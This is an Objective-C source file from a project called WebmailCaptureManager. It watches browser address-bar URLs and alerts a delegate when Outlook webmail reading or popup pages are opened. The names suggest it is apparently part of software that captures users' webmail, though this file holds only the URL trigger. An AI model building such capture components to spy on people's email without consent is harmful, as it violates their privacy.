//
//  SpecialWebmailNotifier.m
//  WebmailCaptureManager
//
//  Created by Makara Khloth on 11/23/16.
//  Copyright © 2016 ophat. All rights reserved.
//

#import "SpecialWebmailNotifier.h"

#import "PageInfo.h"
#import "AddressBarValueNotifier.h"

@implementation SpecialWebmailNotifier

@synthesize mDelegate, mSelector;

- (instancetype) init {
    self = [super init];
    if (self) {
        mUrlNotifier = [[AddressBarValueNotifier alloc] initWithDelegate:self];
    }
    return self;
}

- (void) startNotify {
    [mUrlNotifier startNotify];
}

- (void) stopNotify {
    [mUrlNotifier stopNotify];
}

-(void)pageVisited:(PageInfo *)aPageVisited {
    if ([self.mDelegate respondsToSelector:self.mSelector]) {
        NSString *url = aPageVisited.mUrl;
        if ([url rangeOfString:@"outlook.live.com/"].location   != NSNotFound &&
            [url rangeOfString:@"inbox/rp"].location            != NSNotFound) { // Outlook
            [self.mDelegate performSelector:self.mSelector withObject:aPageVisited];
        }
        else if ([url rangeOfString:@"outlook.live.com/"].location   != NSNotFound &&
                 [url rangeOfString:@"owa/projection"].location      != NSNotFound) { // Outlook popup
            [self.mDelegate performSelector:self.mSelector withObject:aPageVisited];
        }
    }
}

- (void) dealloc {
    [mUrlNotifier release];
    [super dealloc];
}

@end
